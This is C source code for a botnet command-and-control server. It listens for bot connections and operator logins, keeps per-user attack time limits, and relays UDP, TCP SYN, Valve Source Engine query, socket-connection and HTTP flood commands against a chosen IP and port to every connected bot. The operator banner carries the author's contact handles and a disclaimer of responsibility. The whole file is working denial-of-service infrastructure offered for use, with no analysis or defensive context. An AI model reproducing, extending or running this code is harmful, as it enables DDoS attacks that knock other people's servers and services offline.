#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>


#define MAX_USERS 8
#define MAX_BOTS 6500
#define MAX_COMMAND_LENGTH 2048
#define LIGHT_BLUE "\033[1;34m"
#define YELLOW "\033[1;33m"
#define RESET "\033[0m"
#define RED "\033[1;31m"
#define BLUE "\033[1;34m"

typedef struct {
    char user[50];
    char pass[50];
    int maxtime;
    int maxbots;
    int is_logged_in;
} User;

typedef struct {
    int socket;
    struct sockaddr_in address;
    int is_valid;
} Bot;

User users[MAX_USERS];
int user_sockets[MAX_USERS] = {0};
int user_count = 0;
Bot bots[MAX_BOTS];
int bot_count = 0;
int global_cooldown = 0;
pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t cooldown_mutex = PTHREAD_MUTEX_INITIALIZER;

void load_users() {
    FILE *file = fopen("logins.txt", "r");
    while (fscanf(file, "%s %s %d %d", users[user_count].user, users[user_count].pass, &users[user_count].maxtime, &users[user_count].maxbots) != EOF) {
        user_count++;
    }
    fclose(file);
}

int check_login(const char *user, const char *pass) {
    for (int i = 0; i < user_count; i++) {
        if (strcmp(user, users[i].user) == 0 && strcmp(pass, users[i].pass) == 0) {
            if (users[i].is_logged_in) {
                return -2;
            }
            return i;
        }
    }
    return -1;
}

int validate_ip(const char *ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip, &(sa.sin_addr));
}

int validate_port(int port) {
    return port > 0 && port <= 65535;
}

void* handle_bot(void* arg) {
    int bot_socket = *((int*)arg);
    char buffer[MAX_COMMAND_LENGTH];
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int len = recv(bot_socket, buffer, sizeof(buffer), 0);
        if (len <= 0 || strcmp(buffer, "pong") != 0) {
            close(bot_socket);
            pthread_mutex_lock(&bot_mutex);
            for (int i = 0; i < bot_count; i++) {
                if (bots[i].socket == bot_socket) {
                    bots[i] = bots[bot_count - 1];
                    bot_count--;
                    break;
                }
            }
            pthread_mutex_unlock(&bot_mutex);
            break;
        } else if (strcmp(buffer, "pong") == 0) {
            pthread_mutex_lock(&bot_mutex);
            for (int i = 0; i < bot_count; i++) {
                if (bots[i].socket == bot_socket) {
                    bots[i].is_valid = 1;
                    break;
                }
            }
            pthread_mutex_unlock(&bot_mutex);
        }
    }
    free(arg);
    return NULL;
}

void* bot_listener(void* arg) {
    int botport = *((int*)arg);
    int bot_server_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in bot_server_addr;

    bot_server_addr.sin_family = AF_INET;
    bot_server_addr.sin_addr.s_addr = INADDR_ANY;
    bot_server_addr.sin_port = htons(botport);

    int optval = 1;
    setsockopt(bot_server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
    setsockopt(bot_server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    if (bind(bot_server_socket, (struct sockaddr*)&bot_server_addr, sizeof(bot_server_addr)) < 0) {
        perror(RED "Bot port bind failed" RESET);
        exit(EXIT_FAILURE);
    }
    listen(bot_server_socket, MAX_BOTS);

    while (1) {
        int bot_socket = accept(bot_server_socket, NULL, NULL);
        setsockopt(bot_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));

        pthread_mutex_lock(&bot_mutex);
        if (bot_count < MAX_BOTS) {
            bots[bot_count].socket = bot_socket;
            bots[bot_count].is_valid = 0;
            pthread_t bot_thread;
            int *arg = malloc(sizeof(int));
            *arg = bot_socket;
            pthread_create(&bot_thread, NULL, handle_bot, arg);
            pthread_detach(bot_thread);
            bot_count++;
        } else {
            close(bot_socket);
        }
        pthread_mutex_unlock(&bot_mutex);
    }
}


void* ping_bots(void* arg) {
    while (1) {
        sleep(1); 
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            send(bots[i].socket, "ping", strlen("ping"), 0);
            bots[i].is_valid = 0; 
        }
        pthread_mutex_unlock(&bot_mutex);
    }
    return NULL;
}

void* manage_cooldown(void* arg) {
    while (1) {
        sleep(1);
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            global_cooldown--;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }
    return NULL;
}

void log_command(const char* user, const char* command) {
    printf("%s ran command: %s\n", user, command);
}

int is_attack_command(const char *command) {
    return strncmp(command, "!udp", 4) == 0 || strncmp(command, "!syn", 4) == 0 || strncmp(command, "!vse", 4) == 0 || strncmp(command, "!socket", 7) == 0 || strncmp(command, "!http", 5) == 0;
}

void process_command(const User *user, const char *command, int client_socket) {
    char response[MAX_COMMAND_LENGTH];

    if (strlen(command) == 0) { 
        return;
    }

    log_command(user->user, command);

    if (is_attack_command(command)) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            snprintf(response, sizeof(response), 
                     RED "\rGlobal cooldown still active for " 
                     YELLOW "%d seconds\n" 
                     RESET, global_cooldown);
            pthread_mutex_unlock(&cooldown_mutex);
            send(client_socket, response, strlen(response), 0);
            return;
        } 
        pthread_mutex_unlock(&cooldown_mutex);
    }

    if (strcmp(command, "!help") == 0) {
        snprintf(response, sizeof(response), 
                 "\r\n" YELLOW "!stopall - stops all ongoing\n"
                 "\r!help - show this\n"
                 "\r!bots - list bots\n"
                 "\r!clear - clear the screen\n" 
                 BLUE "\r!vse - udp valve source engine query flood [IP] [PORT] [TIME]\n"
                 "\r!udp - UDP Flood without extra headers [IP] [PORT] [TIME]\n"
                 "\r!syn - TCP SYN Flood [IP] [PORT] [TIME]\n"
                 "\r!socket - dataless socket connection flood [IP] [PORT] [TIME]\n" 
                 "\r!http - HTTP flood [IP] [PORT] [TIME]\n"
                 RESET);
    } else if (strcmp(command, "!bots") == 0) {
        int valid_bots = 0;
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_valid) {
                valid_bots++;
            }
        }
        pthread_mutex_unlock(&bot_mutex);
        snprintf(response, sizeof(response), "\rcount: %d\n", valid_bots);
    } else if (strcmp(command, "!clear") == 0) {
        snprintf(response, sizeof(response), "\033[H\033[J");
    } else if (is_attack_command(command)) {
        char ip[20];
        int port, time;
        if (sscanf(command + strlen(command) - strlen(strchr(command, ' ')), "%s %d %d", ip, &port, &time) == 3) {
            if (validate_ip(ip) && validate_port(port)) {
                if (time > user->maxtime) {
                    snprintf(response, sizeof(response), 
                             RED "\rMax time %d sec\n" 
                             RESET, user->maxtime);
                } else {
                    char cmd[20];
                    sscanf(command, "%s", cmd);
                    snprintf(response, sizeof(response), 
                             "\r%s %s:%d for %d seconds\n", 
                             cmd, ip, port, time);
                    pthread_mutex_lock(&bot_mutex);
                    int valid_bots = 0;
                    for (int i = 0; i < bot_count; i++) {
                        if (bots[i].is_valid) {
                            send(bots[i].socket, command, strlen(command), 0);
                            valid_bots++;
                        }
                    }
                    pthread_mutex_unlock(&bot_mutex);
                    snprintf(response + strlen(response), 
                             sizeof(response) - strlen(response), 
                             "\rSent instructions to: %d bots\n", valid_bots);
                    pthread_mutex_lock(&cooldown_mutex);
                    global_cooldown = time;
                    pthread_mutex_unlock(&cooldown_mutex);
                }
            } else {
                snprintf(response, sizeof(response), RED "\rInvalid IP/port\n" RESET);
            }
        } else {
            snprintf(response, sizeof(response), RED "\rInvalid command opt\n" RESET);
        }
    } else if (strcmp(command, "!stopall") == 0) {
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            send(bots[i].socket, "stop", strlen("stop"), 0);
        }
        pthread_mutex_unlock(&bot_mutex);
        snprintf(response, sizeof(response), "\rAttempting to stop attacks...\n");
        pthread_mutex_lock(&cooldown_mutex);
        global_cooldown = 0;
        pthread_mutex_unlock(&cooldown_mutex);
    } else {
        snprintf(response, sizeof(response), RED "\rCmd not found\n" RESET);
    }

    send(client_socket, response, strlen(response), 0);
}

void* update_title(void* arg) {
    int client_socket = *((int*)arg);
    free(arg);

    while (1) {
        int valid_bots = 0;

        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_valid) {
                valid_bots++;
            }
        }
        pthread_mutex_unlock(&bot_mutex);

        char buffer[15000];
        sprintf(buffer, "\0337\033]0;Bots Loaded: %d\007\0338", valid_bots);
        if (client_socket > 0) {
            send(client_socket, buffer, strlen(buffer), 0);
        }

        sleep(1);
    }

    return NULL;
}


void* handle_client(void* arg) {
    int client_socket = *((int*)arg);
    free(arg);

    char buffer[4096];
    sprintf(buffer, "\r" YELLOW "\rLogin: " RESET);
    send(client_socket, buffer, strlen(buffer), 0);

    usleep(1800000);

    char username[2048], password[2048];
    memset(username, 0, 2048);
    memset(password, 0, 2048);

    recv(client_socket, username, sizeof(username), 0);
    username[strcspn(username, "\r\n")] = 0;

    sprintf(buffer, "\r" YELLOW "\rPassword: " RESET);
    send(client_socket, buffer, strlen(buffer), 0);
    usleep(1800000);

    recv(client_socket, password, sizeof(password), 0);
    password[strcspn(password, "\r\n")] = 0;

    int user_index = check_login(username, password);
        if (user_index == -1) {
        sprintf(buffer, "\r" RED "\rInvalid login" RESET);
        send(client_socket, buffer, strlen(buffer), 0);
        close(client_socket);
        }

    while (user_index == -2) {
        sprintf(buffer, "\r" YELLOW "\rUser connected already, Disconnect? Y/N: " RESET);
        send(client_socket, buffer, strlen(buffer), 0);

        char response[2];
        recv(client_socket, response, sizeof(response), 0);
        response[strcspn(response, "\r\n")] = 0;

        if (strcmp(response, "Y") == 0 || strcmp(response, "y") == 0) {
            for (int i = 0; i < user_count; i++) {
                if (strcmp(username, users[i].user) == 0 && strcmp(password, users[i].pass) == 0) {
                    if (user_sockets[i] != 0) {
                        shutdown(user_sockets[i], SHUT_RDWR);
                        close(user_sockets[i]);
                        user_sockets[i] = 0;
                    }
                    users[i].is_logged_in = 0;
                }
            }
            user_index = check_login(username, password);
        } else {
            close(client_socket);
            return NULL;
        }
    }

    if (user_index >= 0) {
        User *user = &users[user_index];
        user->is_logged_in = 1;
        user_sockets[user_index] = client_socket;
        sprintf(buffer, "\rWelcome!\r\nIM NOT RESPONSIBLE for what you do, discord: daylight911, telegram: FuckIsra3l!, Name(I Love Flies)\n\r");
        send(client_socket, buffer, strlen(buffer), 0);

        pthread_t update_thread;
        int *update_arg = malloc(sizeof(int));
        *update_arg = client_socket;
        pthread_create(&update_thread, NULL, update_title, update_arg);
        pthread_detach(update_thread);

        char command[MAX_COMMAND_LENGTH];
        while (1) {
            char prompt[MAX_COMMAND_LENGTH];
            sprintf(prompt, RED "%s@botnet# " RESET, user->user);
            sprintf(buffer, "\r%s", prompt);
            send(client_socket, buffer, strlen(buffer), 0);

            memset(command, 0, sizeof(command));
            int len = recv(client_socket, command, sizeof(command), 0);
            if (len <= 0) {
                close(client_socket);
                user->is_logged_in = 0;
                user_sockets[user_index] = 0;
                break;
            }
            command[strcspn(command, "\r\n")] = 0;

            if (strlen(command) == 0) {
                continue;
            }

            sprintf(buffer, "\r\n");
            send(client_socket, buffer, strlen(buffer), 0);

            process_command(user, command, client_socket);
        }
    }

    return NULL;
}


void* cnc_listener(void* arg) {
    int cncport = *((int*)arg);
    int cnc_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in cnc_addr;
    cnc_addr.sin_family = AF_INET;
    cnc_addr.sin_addr.s_addr = INADDR_ANY;
    cnc_addr.sin_port = htons(cncport);

    int optval = 1;
    setsockopt(cnc_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
    setsockopt(cnc_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    if (bind(cnc_socket, (struct sockaddr*)&cnc_addr, sizeof(cnc_addr)) < 0) {
        perror(RED "CNC port bind failed" RESET);
        exit(EXIT_FAILURE);
    }
    listen(cnc_socket, 10);

    while (1) {
        int client_socket = accept(cnc_socket, NULL, NULL);
        setsockopt(client_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));

        pthread_t client_thread;
        int *arg = malloc(sizeof(int));
        *arg = client_socket;
        pthread_create(&client_thread, NULL, handle_client, arg);
        pthread_detach(client_thread);
    }
}


int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Bad argument\n");
        return 1;
    }

    load_users();

    pthread_t bot_listener_thread, cnc_listener_thread, ping_thread, cooldown_thread;
    int botport = atoi(argv[1]);
    int cncport = atoi(argv[3]);

    pthread_create(&bot_listener_thread, NULL, bot_listener, &botport);
    pthread_create(&cnc_listener_thread, NULL, cnc_listener, &cncport);
    pthread_create(&ping_thread, NULL, ping_bots, NULL);
    pthread_create(&cooldown_thread, NULL, manage_cooldown, NULL);

    pthread_join(bot_listener_thread, NULL);
    pthread_join(cnc_listener_thread, NULL);
    pthread_join(ping_thread, NULL);
    pthread_join(cooldown_thread, NULL);

    return 0;
}
